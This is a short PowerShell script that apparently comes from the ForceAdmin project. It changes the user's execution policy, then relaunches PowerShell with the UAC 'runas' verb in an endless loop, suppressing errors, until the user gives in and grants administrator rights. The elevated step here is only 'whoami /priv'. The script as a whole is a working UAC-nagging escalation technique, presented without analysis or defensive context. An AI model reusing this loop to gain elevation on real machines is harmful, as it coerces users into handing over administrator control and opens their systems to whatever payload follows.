# https://github.com/Chainski/ForceAdmin
Set-ExecutionPolicy -Scope CurrentUser Undefined -Force
while($true)
 {
	 try
  {  
    Start-Process 'powershell' -Verb runas -ArgumentList '-noexit -c whoami /priv';exit
     
	}
   catch{}   
}
